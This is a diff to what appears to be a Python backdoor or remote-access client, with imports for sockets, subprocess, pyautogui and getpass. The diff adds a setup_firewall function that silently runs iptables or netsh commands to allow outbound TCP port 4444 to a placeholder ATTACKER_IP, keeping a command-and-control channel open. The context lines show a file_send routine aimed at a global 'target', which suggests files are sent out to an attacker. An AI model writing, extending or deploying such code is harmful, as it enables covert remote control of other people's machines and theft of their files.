@@ -1,6 +1,14 @@
 import socket, subprocess, platform, os, getpass, json, base64, time, pickle, gzip, pyautogui
 
 
+def setup_firewall(os_name: str = 'nt' or 'posix'):
+    # Need root permission
+    # But we don't need this for many events because some of the firewalls already allow outgoing connections.
+    __command = 'iptables -A OUTPUT -p tcp -d <ATTACKER_IP> --dport 4444 -j ACCEPT' if os_name == 'posix' \
+        else 'netsh advfirewall firewall add rule name="Allow Outbound 4444" dir=out action=allow protocol=TCP localport=4444'
+    subprocess.run(__command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
 def file_send(file_name):
     global target
     with open(file_name, "rb") as file:
